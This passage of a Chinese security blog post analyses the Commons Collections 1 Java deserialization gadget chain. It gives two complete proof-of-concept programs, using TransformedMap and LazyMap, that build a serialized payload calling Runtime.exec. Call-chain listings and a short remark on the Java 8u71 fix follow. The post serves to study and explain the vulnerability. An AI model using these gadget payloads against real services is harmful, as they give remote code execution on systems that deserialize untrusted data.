+<p><img src="/img/markdown-img-paste-20211116172934183.png" srcset="/img/loading.gif" lazyload></p>
+<p>实验结果</p>
+<p><img src="/img/markdown-img-paste-20211116171620552.png" srcset="/img/loading.gif" lazyload></p>
+<p>发现以下情况，这里出现var7的值为null的情况</p>
+<p>分析流程，发现需要满足以下几个条件</p>
+<ul>
+<li> sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类</li>
+<li>其中必须含有至少一个方法</li>
+<li>TransformedMap.decorate 修饰的Map中必须有一个键名为方法名的元素</li>
+</ul>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.HashedMap;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.<span class="hljs-keyword">map</span>.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.<span class="hljs-built_in">Map</span>;<br><br>public <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">POC</span> &#123;</span><br>    public <span class="hljs-keyword">static</span> <span class="hljs-literal">void</span> main(<span class="hljs-built_in">String</span>[] args) throws Exception &#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.<span class="hljs-keyword">class</span>),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>,Class[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">Object</span>.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Object</span>[].<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;<span class="hljs-built_in">String</span>.<span class="hljs-keyword">class</span>&#125;,<span class="hljs-keyword">new</span> <span class="hljs-built_in">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;<br>                )<br>        &#125;);<br><br>        <span class="hljs-built_in">Map</span> <span class="hljs-keyword">map</span> = <span class="hljs-keyword">new</span> HashedMap();<br>        <span class="hljs-keyword">map</span>.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>);<br>        <span class="hljs-built_in">Map</span> outmap = TransformedMap.decorate(<span class="hljs-keyword">map</span>,<span class="hljs-literal">null</span>,chainedTransformer);<br><br>        Class clazz = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor constructor = clazz.getDeclaredConstructor(Class.<span class="hljs-keyword">class</span>,<span class="hljs-built_in">Map</span>.<span class="hljs-keyword">class</span>);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-built_in">Object</span> ob = constructor.newInstance(Retention.<span class="hljs-keyword">class</span>,outmap);<br><br>        FileOutputStream f = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectOutputStream fout = <span class="hljs-keyword">new</span> ObjectOutputStream(f);<br>        fout.writeObject(ob);<br><br>        FileInputStream fi = <span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">&quot;payload.bin&quot;</span>);<br>        ObjectInputStream fin = <span class="hljs-keyword">new</span> ObjectInputStream(fi);<br><br>        <span class="hljs-built_in">Object</span> o = (<span class="hljs-built_in">Object</span>) fin.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>成功执行，完成整个链的调用</p>
+<p><img src="/img/markdown-img-paste-20211116173736390.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="调用链展示"><a href="#调用链展示" class="headerlink" title="调用链展示"></a>调用链展示</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs livescript">ObjectInputStream.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">  -&gt;</span>AnnotationInvocationHandler.readObject<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">      -&gt;</span>TransformedMap.entrySet<span class="hljs-function"><span class="hljs-params">()</span>.<span class="hljs-title">iterator</span><span class="hljs-params">()</span>.<span class="hljs-title">next</span><span class="hljs-params">()</span>.<span class="hljs-title">setValue</span><span class="hljs-params">()</span></span><br><span class="hljs-function">          -&gt;</span>TransformedMap.checkSetValue<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">        -&gt;</span>TransformedMap.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">          -&gt;</span>ChainedTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>ConstantTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>InvokerTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">              -&gt;</span>Method.invoke<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                -&gt;</span>Class.getMethod<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>InvokerTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">              -&gt;</span>Method.invoke<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                -&gt;</span>Runtime.getRuntime<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">            -&gt;</span>InvokerTransformer.transform<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">              -&gt;</span>Method.invoke<span class="hljs-function"><span class="hljs-params">()</span></span><br><span class="hljs-function">                -&gt;</span>Runtime.exec()<br>``<span class="javascript"><span class="hljs-string">`   </span></span><br><span class="hljs-string"><span class="javascript"></span></span><br><span class="hljs-string"><span class="javascript"># AnnotationInvocationHandler+Lazymap</span></span><br><span class="hljs-string"><span class="javascript">如果我们使用Lazymap的链路，则我们需要找到一个map.get()的调用，在AnnotationInvocationHandler中的invoke方法，正好存在一个.get()调用</span></span><br><span class="hljs-string"><span class="javascript">![](/img/markdown-img-paste-20211117143933829.png)</span></span><br><span class="hljs-string"><span class="javascript"></span></span><br><span class="hljs-string"><span class="javascript">在readObject方法里调用this.memberValues.entrySet().iterator()方法，其中this.memberValues可以通过调用AnnotationInvocationHandler构造方法，赋值为LazyMap对象，且LazyMap对象被创建动态代理类，代理接口为Map.class，当调用Map.class类中的方法时，将会调用AnnotationInvocationHandler#invoke方法。entrySet方法是Map.class中的方法，因此会进入AnnotationInvocationHandler#invoke方法中，并调用this.memberValues.get(var4)方法，其中this.memberValues是LazyMap，因此完成了sink点的串联，完成整个gadget的构造。</span></span><br><span class="hljs-string"><span class="javascript"></span></span><br><span class="hljs-string"><span class="javascript">## POC</span></span><br></code></pre></td></tr></table></figure>
+<p>import org.apache.commons.collections.Transformer;<br>import org.apache.commons.collections.functors.*;<br>import org.apache.commons.collections.map.HashedMap;<br>import org.apache.commons.collections.map.LazyMap;<br>import org.apache.commons.collections.map.TransformedMap;</p>
+<p>import java.io.FileInputStream;<br>import java.io.FileOutputStream;<br>import java.io.ObjectInputStream;<br>import java.io.ObjectOutputStream;<br>import java.lang.annotation.Retention;<br>import java.lang.reflect.Constructor;<br>import java.lang.reflect.InvocationHandler;<br>import java.lang.reflect.Proxy;<br>import java.util.Map;</p>
+<p>public class POC {<br>    public static void main(String[] args) throws Exception {<br>        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{<br>                new ConstantTransformer(Runtime.class),<br>                new InvokerTransformer(“getMethod”,new Class[]{String.class,Class[].class},new Object[]{“getRuntime”, null}),<br>                new InvokerTransformer(“invoke”,new Class[]{Object.class,Object[].class},new Object[]{null,null}),<br>                new InvokerTransformer(“exec”,new Class[]{String.class},new String[]{“calc.exe”}<br>                )<br>        });</p>
+<pre><code>    Map map = new HashedMap();
+    map.put(&quot;value&quot;,&quot;1&quot;);
+    Map outmap = LazyMap.decorate(map,chainedTransformer);
+
+    Class clazz = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+    Constructor constructor = clazz.getDeclaredConstructor(Class.class,Map.class);
+    constructor.setAccessible(true);
+
+    InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(Retention.class,outmap);
+    Map proxymap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]&#123;Map.class&#125;,invocationHandler);
+    invocationHandler = (InvocationHandler)constructor.newInstance(Retention.class,proxymap);
+
+    FileOutputStream f = new FileOutputStream(&quot;payload.bin&quot;);
+    ObjectOutputStream fout = new ObjectOutputStream(f);
+    fout.writeObject(invocationHandler);
+
+    FileInputStream fi = new FileInputStream(&quot;payload.bin&quot;);
+    ObjectInputStream fin = new ObjectInputStream(fi);
+
+    Object o = (Object) fin.readObject();
+&#125;
+</code></pre>
+<p>}</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs clean"><br>也可以完成利用<br><br>## 调用链展示<br></code></pre></td></tr></table></figure>
+<p>ObjectInputStream.readObject()<br>  AnnotationInvocationHandler.readObject()<br>    Map(Proxy).entrySet()<br>      AnnotationInvocationHandler.invoke()<br>        LazyMap.get()<br>          ChainedTransformer.transform()<br>            ConstantTransformer.transform()<br>            InvokerTransformer.transform()<br>              Method.invoke()<br>                Class.getMethod()<br>            InvokerTransformer.transform()<br>              Method.invoke()<br>                Runtime.getRuntime()<br>            InvokerTransformer.transform()<br>              Method.invoke()<br>                Runtime.exec()</p>
+<pre><code>
+# 防御
+在在Java 8u71以后，官方修改了AnnotationInvocationHandler.readObject()方法，在其他新添了一个LinkedHashMap对象，并把原来的键值添加进去，导致我们不能通过AnnotationInvocationHandler在高版本利用CC1
+
+# 小结
+本文介绍了CC1链的两种利用方式，并给出了完整POC
+</code></pre>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Common-Collections/">Common-Collections</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/11/15/CommonsCollections-6%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Common-Collections-6 反序列化利用分析</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/08/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E9%A9%BB%E7%95%99%E6%8A%80%E6%9C%AF/">
+                        <span class="hidden-mobile">域渗透之驻留技术</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://github.com/errorecho" target="_blank" rel="nofollow noopener"><span>Github</span></a> <i class="iconfont icon-love"></i> <a href="https://www.errorecho.com" target="_blank" rel="nofollow noopener"><span>Blog</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js" ></script>
+  
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
